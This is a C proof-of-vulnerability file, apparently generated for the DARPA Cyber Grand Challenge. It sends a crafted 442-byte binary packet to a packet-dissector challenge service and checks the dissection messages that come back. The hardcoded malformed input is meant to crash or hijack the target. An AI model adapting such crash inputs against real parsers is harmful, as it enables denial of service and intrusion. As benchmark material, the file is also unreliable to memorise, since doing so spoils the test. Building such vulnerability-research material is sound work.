#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xba\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xa2\x01\x00\x00\x9a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x9a\x01\x00\x00"
         "\x1e\x79\x43\xc8\x68\x42\x42\xc0\x21\xb1\x95\x5c\x8b\x71\x68\x03"
         "\xa7\x0d\xcc\xbe\x01\x00\x00\x00\x35\xf2\xb6\x5c\x83\xd6\xe7\x92"
         "\x01\x9c\xff\x41\x00\xc5\x13\xe8\xff\xff\xb3\x56\xf5\xf4\x69\x33"
         "\x3a\x7a\x8f\x7f\x93\x59\x38\xdb\x24\x2f\x01\x00\x27\x39\x4c\x74"
         "\x57\xff\x01\x00\xfb\x41\x00\xbc\x4d\x4a\x62\xc3\xbd\x00\xb4\xae"
         "\xc6\x17\xd3\xfd\x17\xc4\xb2\x00\x7b\x04\x40\x46\x90\x43\xeb\xff"
         "\xff\x2c\xdf\x0a\x2b\xe5\x90\x42\x5b\xc9\x9d\x70\xe0\xae\x46\x04"
         "\x96\x5a\x41\x00\x48\xcc\x73\xe5\xe5\x26\xc5\x7d\x89\xb6\x18\xf3"
         "\xf5\xe2\xb9\x8a\x01\x37\x34\x5e\x4d\x31\x0b\x49\x5f\xf0\xff\xff"
         "\xff\xf2\x86\x1c\x54\xc3\x10\x01\xf5\xd6\xa2\x5d\x31\x92\x74\x80"
         "\xa3\x73\x70\x7b\xa1\x85\xc5\xe9\x64\x85\xda\xfc\xb1\xf1\xbe\xbc"
         "\x4b\xb9\x7c\x4d\x49\xd6\xf9\xed\x28\xfb\x62\x55\x7e\xea\x27\xdc"
         "\x17\x7b\x9e\xd5\x13\xad\x1d\xd1\xdf\x0f\xf5\x12\xaf\x06\x6f\x76"
         "\xf8\x59\x68\x97\xea\xde\x78\x49\x12\x6d\x86\x60\xca\x4e\x9b\x56"
         "\x84\x0b\x7c\xf2\xf9\x4e\x21\x6d\x30\x06\xa4\x2c\xf6\x2c\x2c\x52"
         "\xec\xcf\x0c\x44\x65\x25\x6d\xc5\xb4\xbc\x37\x0a\xb7\x92\x36\x39"
         "\xa6\x73\xba\x64\x5a\xa0\x4f\xb9\xe3\xd7\x94\x74\x54\xb5\x42\xea"
         "\x0c\x06\x92\x4c\xc6\x1c\xe6\x3b\x95\x4a\xb7\xe1\x61\xf0\xa3\x77"
         "\xf9\xd4\xfe\x2b\x09\xde\x10\x3a\xf6\xc7\x9c\x12\x1e\x41\x8e\x47"
         "\x5f\xa8\xff\x01\x60\xb1\x03\x9f\x89\xb0\x11\x78\x89\x68\x1c\x7e"
         "\x84\xb1\x8e\xd9\x53\xc8\x98\x60\xf5\x99\x57\x01\x4f\xf6\xfd\x08"
         "\xa6\x16\x45\xca\xfc\x91\x67\xb7\xfb\x6b\xc1\x06\x98\x80\x45\x2b"
         "\x20\x63\x16\xe6\xe1\x1a\xa5\xed\xdd\xb9\x44\x12\x73\xcb\xc3\xc7"
         "\x8b\x22\xa5\x3a\xd6\x1f\xf3\x0a\x18\xaf\x74\xf9\xb3\x41\x43\x9a"
         "\x0b\x4d\x08\x8d\xd8\x8b\x41\x0d\x94\x21\xf6\x68\xc8\x06\xb2\xb1"
         "\x9c\x5b\x12\x0a\x07\xaf\x3b\x7a\xad\xeb";
      static unsigned int write_00001_00000_len = 442;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaantioxygen
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x61\x6e\x74\x69\x6f\x78"
         "\x79\x67\x65\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
